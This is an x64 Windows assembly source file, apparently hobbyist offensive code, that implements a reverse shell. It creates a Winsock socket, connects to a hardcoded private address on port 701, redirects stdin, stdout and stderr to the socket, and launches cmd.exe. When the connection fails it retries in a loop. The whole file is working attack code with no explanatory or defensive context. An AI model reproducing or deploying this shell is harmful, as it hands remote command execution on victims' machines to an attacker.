;*************
;By: Teuzero *
;*************

[BITS 64]
global WinMain

extern WaitForSingleObject
extern WSAStartup
extern htons
extern WSAConnect
extern CreateProcessA
extern memset
extern inet_addr
extern CreateThread
extern WSASocketA
extern WSACleanup

section .data
    struc sockaddr_in
        .sin_family resw 1
        .sin_port resw 1
        .sin_addr resd 1
        .sin_zero resb 8
    endstruc

    sock_addr istruc sockaddr_in
        at sockaddr_in.sin_family, dw 0 
        at sockaddr_in.sin_port, dw 0
        at sockaddr_in.sin_addr, dd 0
        at sockaddr_in.sin_zero, dd 0, 0
    iend

    
    struc theProcess
        .cb resd 1
        .lpReserved resb 8
        .lpDesktop resb 8
        .lpTitle resb 0xc
        .dwX resd 1
        .dwY resd 1
        .dwXSize resd 1
        .dwYSize resd 1
        .dwXCountChars resd 1
        .dwYCountChars resd 1
        .dwFillAttribute resd 1
        .dwFlags resd 1
        .wShowWindow resw 1
        .cbReserved2 resw 2
        .lpReserverd2 resb 0xA
        .hStdInput resd 2
        .hStadOutput resd 2
        .hStdError resd 2
    endstruc

    startupinfoa istruc theProcess
       at theProcess.cb, dd 0
       at theProcess.lpReserved, db 0
       at theProcess.lpDesktop, db 0
       at theProcess.lpTitle, db 0
       at theProcess.dwX, dd 0
       at theProcess.dwY, dd 0
       at theProcess.dwXSize, dd 0
       at theProcess.dwYSize, dd 0
       at theProcess.dwXCountChars, dd 0
       at theProcess.dwYCountChars, dd 0
       at theProcess.dwFillAttribute, dd 0
       at theProcess.dwFlags, dd 0
       at theProcess.wShowWindow, dw 0
       at theProcess.cbReserved2, dw 0
       at theProcess.lpReserverd2, db 0
       at theProcess.hStdInput, dd 0
       at theProcess.hStadOutput, dd 0
       at theProcess.hStdError, dd 0
    iend

    cmd db "cmd.exe",00h
    wsaData                  dd 0
    socket                   dd 0
    space dd 0
section .bss

section .code
WinMain:
    Main:
        push rbp
        mov rbp, rsp
        add rsp, 0xFFFFFFFFFFFFFF80
        
        WsaData:
            mov rdx, wsaData
            mov ecx, 0x202
            call WSAStartup

        WScoketA:            
            mov [rsp+28], dword 0x00
            mov [rsp+20], dword 0x00
            mov r9d,dword 0x00
            mov r8d,0x06
            mov edx, 0x01
            mov ecx, 0x02
            call WSASocketA
            mov rdx,rax
            lea rax, [socket]
            mov [rax], rdx

         Htons:
            mov ecx, 0x2BD
            call htons
        
         Inet:
            mov edx,eax
            lea rax, [sock_addr+sockaddr_in.sin_port]            
            mov word [rax], dx
            lea rax,  [sock_addr+sockaddr_in.sin_family]
            mov word [rax], word 0x02
            mov dword [sock_addr+sockaddr_in.sin_addr], 0x9700000a
            lea rcx, [sock_addr+sockaddr_in.sin_addr]
            call inet_addr
        Connect:
            lea rax, [socket]
            mov rax, [rax]
            mov [rsp+30], dword 0x00
            mov [rsp+28], dword 0x00
            mov [rsp+20], dword 0x00
            mov r9d,0x00
            mov r8d, 0x10
            lea rdx,[sock_addr+sockaddr_in.sin_family]
            mov rcx, rax
            call WSAConnect
            cmp eax, 0xFFFFFFFF
            jne Cmd
        Cleanup:
            call WSACleanup
            jmp WsaData
        Cmd:
            mov r8d, 0x68
            mov edx, 0
            lea rax ,[startupinfoa+theProcess.cb]         
            mov rcx, rax
            call memset
            lea rax,[startupinfoa+theProcess.cb]
            mov [rax], byte 0x68
            lea rax,[startupinfoa+theProcess.cb]
            mov [startupinfoa+theProcess.dwFlags], dword 0x100
            lea rax, [socket]
            mov rax, [rax]
            mov rdx,rax
            mov [startupinfoa+theProcess.hStdInput],rdx
            mov [startupinfoa+theProcess.hStadOutput],rdx
            mov [startupinfoa+theProcess.hStdError],rdx
            lea rax,[space]
            mov [rsp+0x48], rax
            lea rax, [startupinfoa+theProcess.cb]
            mov [rsp+0x40], rax
            mov [rsp+0x38], dword 0
            mov [rsp+0x30], dword 0
            mov [rsp+0x28], dword 0
            mov [rsp+0x20], dword 1
            mov r9d,0
            mov r8d,0
            lea rdx, [cmd]
            mov ecx, 0
            xor r10,r10
            call CreateProcessA
            jmp WsaData 
